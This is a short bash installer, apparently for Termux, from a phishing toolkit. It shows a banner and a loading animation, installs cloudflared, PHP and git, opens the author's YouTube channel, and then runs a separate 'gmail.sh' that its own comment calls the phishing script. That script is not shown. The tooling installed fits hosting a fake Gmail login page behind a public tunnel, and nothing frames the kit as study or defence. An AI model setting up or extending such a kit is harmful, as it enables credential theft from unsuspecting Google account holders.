#!/usr/bin/env bash

# Define color codes
YELLOW='\033[1;33m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Banner
echo ""
echo -e "${YELLOW} Please wait for Setup ....[${GREEN}✓${BLUE}]${GREEN}"
echo ""
echo -e "${GREEN}░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░${NC}"
echo ""

# Loading animation
echo -n "Loading "
if command -v timeout &> /dev/null; then
    timeout 3s bash -c '
    while true
    do
        echo -n "."
        sleep 1
    done
    '
else
    for i in {1..3}; do
        echo -n "."
        sleep 1
    done
fi
echo " Done!"

# Update packages
pkg update -y && pkg upgrade -y

# Install Cloudflared if not installed
if ! command -v cloudflared &> /dev/null; then
    echo -e "${YELLOW}[!] Cloudflared not found. Installing...${NC}"
    pkg install cloudflared -y > /dev/null 2>&1
    echo -e "${GREEN}[✔] Cloudflared installed.${NC}"
else
    echo -e "${GREEN}[✔] Cloudflared already installed.${NC}"
fi

# Install PHP and Git
pkg install -y php git

# Final messages
echo -e "${GREEN}Installed Successfully..${BLUE}[✓]${NC}"
echo -e "${GREEN}~${NC} $ .....${GREEN}SUBSCRIBE My YOUTUBE Channel${NC}.....${BLUE}[${GREEN}✓${BLUE}]${NC}"

# Open YouTube Channel
termux-open-url https://youtube.com/@zerodarknexus

# Start phishing script
bash gmail.sh
